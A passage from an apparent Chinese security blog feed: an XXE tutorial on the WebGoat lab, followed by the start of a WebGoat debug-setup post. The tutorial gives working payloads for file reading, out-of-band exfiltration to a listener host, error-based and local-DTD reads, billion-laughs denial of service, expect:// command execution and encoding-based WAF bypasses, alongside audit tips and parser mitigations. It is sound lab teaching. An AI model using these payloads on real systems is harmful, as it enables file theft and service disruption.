dtd"&gt;</code></pre><p>观察到评论区回显了远程DTD文件中定义的实体值：<br><img src="https://i.loli.net/2021/08/05/vsgxY1NbPHZwoS3.png"><br>修改POC，测试使用参数实体引用外部DTD:</p><pre><code class="xml">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE a [&lt;!ENTITY % x SYSTEM "http://127.0.0.1:8090/note.dtd"&gt;%x;]&gt;&lt;comment&gt;&lt;text&gt;&amp;p;&lt;/text&gt;&lt;/comment&gt;</code></pre><p>外部DTD中参数实体data获取C:\2.txt文件内容，实体p定义为 <code>%data;</code> 的值：</p><pre><code class="xml">&lt;!ENTITY % data SYSTEM "file:///c://2.txt"&gt; &lt;!ENTITY p "%data;"&gt;</code></pre><p>通过评论区的回显内容可以看到，成功读取到了C:\2.txt的文件内容。<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8216a4fbd64dc4440bf4bbcb699311ef.png"></p><h4 id="XXE盲注"><a href="#XXE盲注" class="headerlink" title="XXE盲注"></a>XXE盲注</h4><p>有时候没有办法获得回显信息(这里的测试环境会回显错误信息，假装看不见)，可以尝试利用带外数据(Out of Band, OOB)进行利用(或者利用一些延时、错误状态码等判断)，也就是盲XXE的利用，继续修改上一步的payload，首先发起的XML载荷中定义了两个参数实体，data 值是文件C:\2.txt的内容，param3 值的内容是远程文件note.dtd，然后引用参数实体param3：</p><pre><code class="xml">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [    &lt;!ENTITY % data SYSTEM "file:///c:/2.txt"&gt;    &lt;!ENTITY % param3 SYSTEM "http://127.0.0.1:8090/note.dtd"&gt;    %param3;]&gt;&lt;comment&gt; &lt;text&gt;&amp;text;&lt;/text&gt;&lt;/comment&gt;</code></pre><p>引用后会先到 <a href="http://127.0.0.1:8090/note.dtd">http://127.0.0.1:8090/note.dtd</a> 加载note.dtd，在参数实体的理解中已经知道解析的过程了，引用p后定义send、解析data的值，然后引用send，带着text的值发起远程dtd请求，将数据带出：</p><pre><code class="xml">&lt;!ENTITY % p "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://127.0.0.1:8090/2.dtd?text=%data;'&gt;"&gt; %p;%send;</code></pre><p>发送POC后，成功获取到带外数据：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/034526faa3470a0d2171a588f59cadea.png"><br>上面是利用参数实体获取文件内容后，请求外部实体时将数据参数发送到服务器。但是如果文件内容存在多行时，会出现错误<code>ParseError at xx Message: Illegal character in URL</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/00072e3176412e10667471f6ed1a0c23.png"><br>参考了一些文章<a href="https://landgrey.me/blog/9/">Java xxe oob 读取多行文件失败的原因</a>，发现是在JDK中做了限制，数据带外在文件中存在一些如<code>%，&amp;</code>等特殊字符时也会抛出异常，一些协议(gopher)也在高版本中无法使用。所以说XXE能否深入利用还得看JDK的版本。在测试该类型XXE时，可以使用服务工具<a href="https://github.com/TheTwitchy/xxer">XXER</a>，可以开启HTTP和FTP服务获取带外数据：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2a333431c3588ae423f9988970e2c358.png"></p><h4 id="XXE报错注入"><a href="#XXE报错注入" class="headerlink" title="XXE报错注入"></a>XXE报错注入</h4><p>利用XML解析过程中访问不到远程DTD文件返回404造成报错，错误信息中将包含文件内容:</p><pre><code class="xml">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE r [&lt;!ENTITY % data3 SYSTEM "file:///c://2.txt"&gt;&lt;!ENTITY % sp SYSTEM "http://127.0.0.1:8090/note.dtd"&gt;%sp;%param3;%exfil;]&gt;</code></pre><p>web服务器上8090端口托管的note.dtd:</p><pre><code class="xml">&lt;!ENTITY % param3 "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://127.0.0.1:8090/txt=%data3;'&gt;"&gt;</code></pre><p>可以看到一边用带外收到了文件内容，一边也在错误信息中回显了，这里的报错是因为加载远程的dtd文件后xml进行解析，我们要读取的文件不符号dtd的格式要求，就抛出了错误：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/e5d84ad4a653b1be54531ceb0a43e0c6.png"><br>一般的都可以使用找不到文件的错误来进行回显：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/49180cc60c3717718fde88bc968f58e8.png"><br>用协议不存在报错读取多行包含<code>:</code>的文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/096aa525d9a94d7a11b1dca3032318f5.png"></p><p><em>本地DTD利用</em><br>在某些情况下，漏洞点支持XML外部实体但是不直接回显数据，在这种情况下选择数据带外和报错回显的方式来利用，但是如果目标系统存在防火墙限制就不能使用数据带外，在报错注入中用到的外部DTD是这样的:</p><pre><code class="xml">&lt;!ENTITY % param3 "&lt;!ENTITY % exfil SYSTEM 'http://127.0.0.1:8090/txt=%data3;'&gt;"&gt;</code></pre><p>在参数实体类型中，不能在DOCTYPE中用实体中包含一个实体，会抛出异常<code>参数实体引用 xxx, 不能出现在 DTD 的内部子集中的标记内</code>。这时可以通过加载一些本地DTD，通过重定义本地DTD中的实体值进行利用。主要原理是XML在使用实体时，如果两个实体名称相同，则仅使用第一个实体。这样就可以在XML内部对实体进行重新定义然后利用本地DTD来进行参数实体解析，例如在服务器本地存在如下FIle0.dtd文件:</p><pre><code class="xml">&lt;!ENTITY % condition "and | or | not | equal | contains | exists | subdomain-of"&gt;&lt;!ELEMENT pattern (%condition;)&gt;</code></pre><p>FIle0.dtd文件中有一个condition参数实体，然后在下面ELEMENT标签中对参数实体进行引用定义为pattern的元素。 那么在poc中利用如下，引用FIle0.dtd文件后，重定义参数实体condition ：</p><pre><code class="xml">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % x SYSTEM "file:///C:\\FIle0.dtd"&gt;&lt;!ENTITY % condition 'aaa)&gt;       &lt;!ENTITY &amp;#x25; file SYSTEM "file:///C:/2.txt"&gt;       &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///21.txt/&amp;#x25;file;&amp;#x27;&gt;"&gt;       &amp;#x25;eval;       &amp;#x25;error;       &lt;!ENTITY aa(bb'&gt;%x;]&gt;&lt;comment&gt; &lt;text&gt;123&lt;/text&gt;&lt;/comment&gt;</code></pre><p>发送POC后成功通过报错回显获得文件内容：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/71d6e54319b4502aabf0fccc9770f2d0.png"><br>分析POC，其中定义了condition，在%x解析后，File0.dtd的内容其实是在新定义的condition顺序之后，condition会被劫持为我们定义的内容，如下测试可以看到先定义的效果：</p><pre><code class="xml">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE a [&lt;!ENTITY b "aaaaaaaaa"&gt;&lt;!ENTITY b "bbbbbbbbb"&gt;&lt;!ENTITY b "ccccccccc"&gt;]&gt;&lt;comment&gt;&lt;text&gt;&amp;b;&lt;/text&gt;&lt;/comment&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/ee0a5b720dcfb6e65a98282c0436d722.png"><br>我们知道实体就是参数值的引用，就等于把condition的内容放到dtd中，引入时会自动解析一次编码，所以在FIle0.dtd被解析后的XML内部的结果如下:</p><pre><code class="xml">&lt;!-- &lt;!ENTITY % condition "and | or | not | equal | contains | exists | subdomain-of"&gt;  --&gt;&lt;!ELEMENT pattern ( aaa)&gt;&lt;!ENTITY % file SYSTEM "file:///C:/2.txt"&gt;&lt;!ENTITY % eval "&lt;!ENTITY % error SYSTEM 'file:///21.txt/%file;'&gt;"&gt; %eval; %error;&lt;!ENTITY aa(bb)&gt;</code></pre><p>这样一来先用 <code>aaa)&gt;</code>闭合之前的标签，然后再引入新的参数实体，最后使用<code>&lt;!ENTITY aa(bb</code>闭合末尾标签，结合起来就跟使用外部实体一样的了，在xml中的定义是一个字符串，符号实体编码会在引用时自动解码，所以单引号转为了<code>&amp;#x27;</code>；百分号转为了<code>&amp;#x26;#x25;</code>，解码一次后还原为<code>&amp;#x25;</code>，再次引用时就还原到参数实体的<code>%</code>了 。</p><p>如何查找这些可利用的本地DTD?在<a href="https://github.com/GoSecure/dtd-finder/releases/download/1.1/dtd-finder-1.1-all.jar">github</a>上有一个可利用的工具，使用<code>java -jar dtd-finder-1.1-all.jar xxx.jar</code>，这里找了一个jboss的安装包进行扫描，存在一个可利用的dtd：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/a9a6529ca3ee485264b707ebab29cd85.png"><br>POC中加上jar协议读取压缩文件，直接在错误中获得文件内容回显:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/e6a6654f51a2bfb619625872f492667f.png"></p><p>windows中默认存在一个可利用的dtd<code>C:\Windows\System32\wbem\xml\cim20.dtd</code>：</p><pre><code class="xml">&lt;!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd"&gt;&lt;!ENTITY % SuperClass '&gt;Your DTD code&lt;!ENTITY test "test"'&gt;%local_dtd;</code></pre><p>当然了，将这个<code>C:\Windows\System32\wbem\xml</code>打包成zip，使用工具扫描一波：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/7acd2861395e2d3a100e2a52e5c995e6.png"><br>直接利用：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/04272bda476d76d7dc71418119586f76.png"></p><h4 id="XXE-DOS"><a href="#XXE-DOS" class="headerlink" title="XXE DOS"></a>XXE DOS</h4><p>一个多重实体嵌套的例子：</p><pre><code class="xml">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE lolz [ &lt;!ENTITY lol "lol"&gt; &lt;!ELEMENT lolz (#PCDATA)&gt; &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt; &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt; &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt; &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt; &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt; &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt; &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt; &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt; &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><p>XXE的拒绝服务攻击在高版本JDK中进行了缓解，JDK会检测实体嵌套：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/69bf1c6a1a2e6d4ed624bfb7af68ec17.png"></p><h3 id="XXE协议支持"><a href="#XXE协议支持" class="headerlink" title="XXE协议支持"></a>XXE协议支持</h3><p>使用网上的一张图来描述：<br><img src="https://i.loli.net/2021/08/09/LhWV7beiMR8cpOq.png"><br>PHP中如果开启了expect支持可以进行RCE：</p><pre><code class="xml">&lt;!ENTITY rce SYSTEM "expect://ifconfig"&gt;</code></pre><p>JAVA中因为JDK版本原因，gopher在JDK8移除、netdoc(netdoc:///tmp)在JDK9中移除。jar协议的使用方法：</p><pre><code class="html">local =&gt; jar:file:///var/myarchive.zip!/file.txtremote =&gt; jar:https://download.host.com/myarchive.zip!/file.txt</code></pre><p>用jar协议外带数据：<br><img src="https://i.loli.net/2021/08/09/qUa7jxLB5AvMX4V.png"><br>利用jar协议下载临时文件：<br><img src="https://i.loli.net/2021/08/16/V2xt4RdsBUQAEie.png"><br>利用zip中不存在的文件引发报错，抛出临时文件路径(一般默认是用户temp下<code>C:\Users\&lt;user&gt;\AppData\Local\Temp</code>,Linux默认在容器temp)：<br><img src="https://i.loli.net/2021/08/16/bnmlHqNKrLFJ35y.png"><br>这是一个用来在传输中进行延时的脚本,通过<code>python x.py x.zip</code>使用(x.zip末尾添加00垃圾字符):</p><pre><code class="python">import sys import time import threading import socketserver from urllib.parse import quote import http.client as httpc listen_host = 'localhost' listen_port = 9999 jar_file = sys.argv[1]class JarRequestHandler(socketserver.BaseRequestHandler):      def handle(self):        http_req = b''        print('New connection:',self.client_address)        while b'\r\n\r\n' not in http_req:            try:                http_req += self.request.recv(4096)                print('\r\nClient req:\r\n',http_req.decode())                jf = open(jar_file, 'rb')                contents = jf.read()                headers = ('''HTTP/1.0 200 OK\r\n'''                '''Content-Type: application/java-archive\r\n\r\n''')                self.request.sendall(headers.encode('ascii'))                self.request.sendall(contents[:-1])                time.sleep(300)                print(30)                self.request.sendall(contents[-1:])            except Exception as e:                print ("get error at:"+str(e))if __name__ == '__main__':    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler)     print ('waiting for connection...')     server_thread = threading.Thread(target=jarserver.serve_forever)     server_thread.daemon = True     server_thread.start()     server_thread.join()</code></pre><h2 id="0x03-XXE漏洞挖掘"><a href="#0x03-XXE漏洞挖掘" class="headerlink" title="0x03 XXE漏洞挖掘"></a>0x03 XXE漏洞挖掘</h2><p>1.XML格式请求<br>黑盒测试中主要是对服务器可能解析XML的位置发送XXE载荷观察服务器响应，一般请求中存在<code>Content-Type: application/xml</code>或者请求体是XML格式的都可以进行测试。</p><p>2.JSON格式请求<br>在一些JSON格式的请求中可以尝试修改请求头为<code>Content-Type: application/xml</code>，对JSON接口进行XXE测试；或者对JSON格式的数据进行一些破坏来观察服务器响应，在JAVA中有时会出现相关的堆栈报错，可以观察进行处理的类，如果类同时支持XML解析，就可以进行XXE的测试。</p><p>3.文件上传XXE<br>如果支持上传XML文件或上传的文件中可以存在XML数据，就可能存在服务器解析XML的情况，在CSAWQual 2019-Web_Unagi中解析XML文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/757406732ed8f2926d57cdc6380d8fab.png"><br>另外在很多xls、xlsx等类型文件上传也会存在XML解释，可以将文件解压后在内部的XML文件中插入Payload进行测试(实例见后文绕过部分)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4eb17c6a412191e1bc51f3bb7eec119d.png"><br>如下上传xlsx文件进行XXE时遇到了后端JAVA禁用外部实体(禁用了DOCTYPE声明)的情况：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/27147480514317e34d3843b6c33bb20f.png"></p><h2 id="0x04-XXE代码审计"><a href="#0x04-XXE代码审计" class="headerlink" title="0x04 XXE代码审计"></a>0x04 XXE代码审计</h2><p>在Webgoat中，漏洞代码在webgoat-lessons中，根据漏洞名称可以找到XXE漏洞源码位置：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/5f0406856897c0d6b2b2701a31fe418e.png"><br>代码中使用Mapping注解来注册URL映射。为 <code>@PostMapping</code> 、<code>@GetMapping</code> 、 <code>@RequestMapping</code> ，根据关键字 Mapping 搜索注册的URL地址：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/e105cfa46985d20928c7e69b0ee2c43d.png"><br>需要说明的是URL映射<code>xxe/comments</code> 是用来获取回显的评论数据的，可以通过这个位置来获得XXE实现后的回显数据：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/25a5044fca8cd78f6ac745568c4434c2.png"><br>在第一个文件<code>org/owasp/webgoat/xxe/BlindSendFileAssignment.java</code>中注册了<code>xxe/bind</code>路由：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/6ad6b5fde3b56305c69919bc1dd29140.png"><br>程序通过<code>@RequestBody</code>注解获取请求体，注解<code>@RequestBody</code>接收的参数是来自<code>requestBody</code>中，并将其转换为String类型保存在commentStr变量中，然后检查session属性中是否设置applySecurity开启了安全模式，随后将传入的Body和安全模式状态参数secure传入parseXML进行处理：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/25607f0c34375f48b1c3642619e30e44.png"><br>接下来需要具体分析comment.parseXML函数的处理，右键选择parseXml转到实现：<br><img src="https://i.loli.net/2021/08/16/5kBpiw9Vle3JnLh.png"><br>parseXML是类Comments的一个方法，通过使用<code>javax.xml.stream.XMLInputFactory</code>和<code>javax.xml.bind.JAXBContext</code>处理XML后返回评论的内容，明显可以看到解析类的使用以及内置的缓解方法:<br><img src="https://i.loli.net/2021/08/16/Hd3ZS69DranPTxC.png"><br>内置的缓解代码通过设置JDK中XMLConstants类属性<code>ACCESS_EXTERNAL_DTD</code>和<code>ACCESS_EXTERNAL_SCHEMA</code>，在<a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP备忘录</a>中有详细记录：</p><pre><code class="java"> // 设置允许对指定协议的外部DTD和外部实体引用的访问。xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");xif.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); </code></pre><p>直接patch代码，开启安全措施：<br><img src="https://i.loli.net/2021/08/16/su3F517QNvhPHl4.png"><br>这里错误提示为“无法读取外部文档 ‘note.dtd’, 因为 accessExternalDTD 属性设置的限制导致不允许 ‘http’ 访问”，这两个属性在JDK中的说明如下：<br><img src="https://i.loli.net/2021/08/16/T1Fd73eHgLhOl9c.png"><br>也就是这是一个白名单的设置，可以设置一些允许的协议，这里尝试允许<code>file://</code>：</p><pre><code class="java">xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "file");xif.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "file"); </code></pre><p><img src="https://i.loli.net/2021/08/16/lqAS6e7nh8Zk3fi.png"><br>再来看XMLInputFactory类中安全设置，这里抛出的是“引用了实体 “r”, 但未声明它。”异常:</p><pre><code class="java">xif.setProperty(XMLInputFactory.SUPPORT_DTD, false); //完全禁用DTD支持xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false); //禁用外部实体</code></pre><p>这里实验开启DTD支持，但禁用外部实体，parseXml返回为””，<code>CONTENTS.contains(comment.getText())</code>会返回true:</p><pre><code class="java">xif.setProperty(XMLInputFactory.SUPPORT_DTD, true); xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false); //禁用外部实体</code></pre><p><img src="https://i.loli.net/2021/08/16/QMokdWAZVH8fjya.png"><br>这里的parseXml虽然返回的为””，总体来说还是返回了comment这个类，parseXml返回的只是comment.text，所以这里contains并没有异常，返回了true，等于说<code>CONTENTS.contains("")</code>返回true，参考<a href="https://blog.csdn.net/q563730343/article/details/82149601">Java Contains()方法传入空（非null）字符串的返回结果</a>。<br>所以这里读取空文件也可以让contains返回true:<br><img src="https://i.loli.net/2021/08/16/dia6U8Z7z5hyYpX.png"></p><p>经过上面的分析，在代码审计中寻找XXE漏洞，可以通过关键字寻找XML处理类的使用，并检查是否设置了安全限制(setProperty、setAttribute、setXIncludeAware、setExpandEntityReferences、setFeature)：<br>XMLInputFactory（StAX 解析器），一般的禁用代码：</p><pre><code class="java">factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);</code></pre><p>其他类的禁用代码参考：</p><pre><code class="java"> javax.xml.stream.XMLInputFactory ...// This disables DTDs entirely for that factoryxmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);// disable external entitiesxmlInputFactory.setProperty("javax.xml.stream.isSupportingExternalEntities", false);</code></pre><p>XMLConstants (包含基本 XML 值作为常量的实用程序类，可用于设置XML安全属性)</p><pre><code class="java">javax.xml.XMLConstants....setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");</code></pre><p>常见XML解释类：</p><pre><code class="java">javax.xml.stream.XMLInputFactoryjavax.xml.bind.JAXBContextjavax.xml.parsers.DocumentBuilderFactoryjavax.xml.parsers.SAXParserjavax.xml.transform.TransformerFactoryjavax.xml.validation.Validatorjavax.xml.validation.SchemaFactoryjavax.xml.transform.sax.SAXTransformerFactoryjavax.xml.transform.sax.SAXSourceorg.xml.sax.XMLReaderDocumentHelper.parseTextDocumentBuilderorg.xml.sax.helpers.XMLReaderFactoryorg.dom4j.io.SAXReaderorg.jdom.input.SAXBuilderorg.jdom2.input.SAXBuilderjavax.xml.bind.Unmarshallerjavax.xml.xpath.XpathExpressionjavax.xml.stream.XMLStreamReaderorg.apache.commons.digester3.Digesterorg.xml.sax.SAXParseExceptionpublicId</code></pre><p>然后就针对性的对xml处理的位置进行跟踪，查看关键代码是否进行了安全处理。</p><p>更多详情：<a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html</a></p><h2 id="0x05-XXE绕过"><a href="#0x05-XXE绕过" class="headerlink" title="0x05 XXE绕过"></a>0x05 XXE绕过</h2><p>这两种绕过同样是在<a href="https://buuoj.cn/challenges">CSAWQual 2019-Web_Unagi</a>用到的<br>1.UTF-7编码<br>编码网页工具：<a href="http://toolswebtop.com/text/process/decode/UTF-7">http://toolswebtop.com/text/process/decode/UTF-7</a><br>将POC转换为UTF-7编码：</p><pre><code class="xml">&lt;!DOCTYPE users [&lt;!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" &gt;]&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/361a5b90a7db17b4047fcf499545b1af.png"><br>编码结果：</p><pre><code class="xml">+ADwAIQ-DOCTYPE users +AFs+ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///C:/Windows/win.ini+ACI +AD4AXQA+-</code></pre><p>绕过WAF:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4f33d035f17ab95352749c1725a9007f.png"><br>在PhpSpreadsheet的<a href="https://github.com/PHPOffice/PhpSpreadsheet/issues/771">issues</a>中也可以看到这样的XXE绕过方式：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/da7f7abba9d6687024d4bb018e5e5612.png"></p><p>2.文件编码转换<br>将文件的编码转换为UTF16，网上大部分都是这种方法：</p><pre><code class="bash">iconv -f utf8 -t utf16 sample.xml&gt;2.xml</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8fcc98bb7888e96239a07151dbf53df1.png"></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://github.com/PHPOffice/PhpSpreadsheet/issues/771">PhpSpreadsheet XXE</a><br><a href="https://www.cnblogs.com/zpchcbd/p/14774132.html">Java EXCEL XXE</a><br><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a><br><a href="https://www.ajsafe.com/news/185.html">XXE漏洞原理及利用</a><br><a href="https://gosecure.github.io/xxe-workshop/#7">Advanced XXE Exploitation</a><br><a href="https://blog.noob.ninja/spilling-local-files-via-xxe-when/">本地DTD利用</a><br><a href="https://pay.weixin.qq.com/wiki/doc/api/micropay.php?chapter=23_5">微信XXE修复</a><br><a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">XXE拒绝服务攻击Billion Laughs</a><br><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP XML 外部实体预防</a><br><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">利用本地 DTD 文件利用 XXE</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webgoat靶场调试环境配置</title>
      <link href="/2021/10/05/webgoat-ba-chang-diao-shi-huan-jing-pei-zhi/"/>
      <url>/2021/10/05/webgoat-ba-chang-diao-shi-huan-jing-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>选择<a href="https://www.jetbrains.com/idea/download/">IDEA</a>作为源码调试工具，<a href="https://github.com/WebGoat/WebGoat">Webgoat</a>作为漏洞分析的靶场。将项目源码下载到本地，使用IDEA调试模式编译运行Webgoat。</p><h2 id="0x02-IEAD汉化配置"><a href="#0x02-IEAD汉化配置" class="headerlink" title="0x02 IEAD汉化配置"></a>0x02 IEAD汉化配置</h2><p>在安装好IDEA后，可使用插件进行汉化，提高后续的调试效率。在File-Setting-Plugins中搜索Chinese插件安装：<br><img src="https://i.loli.net/2021/08/04/bWxUQuoqHgkiZvT.png"><br>加载插件进行使用：<br><img src="https://i.loli.net/2021/08/04/VNtxHrbmJDn6a8z.png"><br>安装完成后重启软件，界面汉化成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/0646248cf3c557b3aa777447f81b6e79.png"></p><h2 id="0x03-WebGoat配置"><a href="#0x03-WebGoat配置" class="headerlink" title="0x03 WebGoat配置"></a>0x03 WebGoat配置</h2><p>配置源码WebGoat-develop，用IDEA2021.2来导入项目(2021.2选择文件夹打开，然后手动配置；2019.3.2中可以选择导入项目自动配置。)，mavn会自动下载依赖启动：<br><img src="https://i.loli.net/2021/08/04/gQJ9ojfDzOa21R5.png"><br>mavn仓库默认在海外，配置文件默认位置在<code>C:\Users\&lt;用户名&gt;\.m2wrapper\dists\</code>中，在setting.xml中配置国内阿里云加速仓库地址：</p><pre><code class="xml">  &lt;mirrors&gt;    &lt;mirror&gt;        &lt;id&gt;alimaven&lt;/id&gt;        &lt;name&gt;aliyun maven&lt;/name&gt;&lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;    &lt;/mirror&gt;    &lt;mirror&gt;        &lt;id&gt;repo2&lt;/id&gt;        &lt;name&gt;repo2 maven&lt;/name&gt;        &lt;url&gt;http://repo2.maven.org/maven2&lt;/url&gt;        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;    &lt;/mirror&gt;  &lt;/mirrors&gt;</code></pre><p><img src="https://i.loli.net/2021/08/04/tYbVoEzBQlZa1Mx.png"></p><p>这个过程中可能会遇到包已经在仓库中存在但是mvn依赖报红，可以尝试关闭项目后，重新导入项目。最终效果：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/22820cf4926c6e38c429dea528bea41d.png"></p><h2 id="0x04-JDK和热重载配置"><a href="#0x04-JDK和热重载配置" class="headerlink" title="0x04 JDK和热重载配置"></a>0x04 JDK和热重载配置</h2><p>WebGoat需要使用JDK15来运行，在菜单”文件”-“项目结构”-“JDK”中配置版本为<a href="http://jdk.java.net/15/">JDK15</a>:<br><img src="https://i.loli.net/2021/08/04/VnZADElt6gWNhCu.png"><br>然后在左上角🔨图标配置菜单里选择编辑项目配置,添加一个Spring Boot配置，名称为StartWebGoat，主类org.owasp.webgoat.StartWebGoat，这一步可能输入了主类会报错，提示找不到main函数，要等idea扫描一下类，然后就自己好了:<br><img src="https://i.loli.net/2021/08/04/rdx4onaIChsplJR.png"><br>同样配置webwolf(用来验证一些请求的服务，如SSRF之类的)，下面记得设置下更新操作,用来在代码中增加语句后热重载:<br><img src="https://i.loli.net/2021/08/04/zRCi1L4muDyWs2c.png"><br>点击调试按钮，访问本地8080，程序已经运行起来了:<br><img src="https://i.loli.net/2021/08/04/OQBXF76ckWJCLVH.png"><br>然后在<code>src/main/java/org/owasp/webgoat/users/UserService.java</code>中用户名检查断点，浏览器中登录，可以看到成功命中:<br><img src="https://i.loli.net/2021/08/05/Pmfyjs37RA9eVqO.png"><br>再试试热重载，加入一条打印语句，然后重载类:<br><img src="https://i.loli.net/2021/08/05/TSQNfmFGkIe5u2q.png"><br>已经输出了调试语句:<br><img src="https://i.loli.net/2021/08/05/8vltejyMwENUs7f.png"></p><h2 id="0x04-Burp抓包配置"><a href="#0x04-Burp抓包配置" class="headerlink" title="0x04 Burp抓包配置"></a>0x04 